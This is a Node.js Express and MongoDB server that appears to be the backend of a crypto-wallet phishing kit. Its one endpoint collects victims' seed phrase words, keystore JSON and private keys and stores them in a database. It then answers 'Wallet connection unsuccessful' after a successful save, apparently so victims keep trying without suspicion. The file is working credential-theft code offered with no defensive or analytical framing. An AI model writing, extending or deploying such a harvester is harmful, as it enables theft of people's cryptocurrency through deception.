const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.log('MongoDB connection error:', err));

// Define a schema for wallet data
const walletSchema = new mongoose.Schema({
  walletName: String,
  walletAddress: String,
  phraseWords: [String],
  keystoreJSON: String,
  privateKey: String,
}, { timestamps: true });

const Wallet = mongoose.model('Wallet', walletSchema);

// Endpoint to handle wallet data
app.post('/api/send-wallet-data', async (req, res) => {
  const { walletName, walletAddress, phraseWords, keystoreJSON, privateKey } = req.body;

  try {
    const newWallet = new Wallet({
      walletName,
      walletAddress,
      phraseWords,
      keystoreJSON,
      privateKey,
    });

    await newWallet.save();
    res.status(200).send('Wallet connection unsuccessful');
  } catch (error) {
    console.error('Error connecting wallet data:', error);
    res.status(500).send('Error connecting wallet data');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));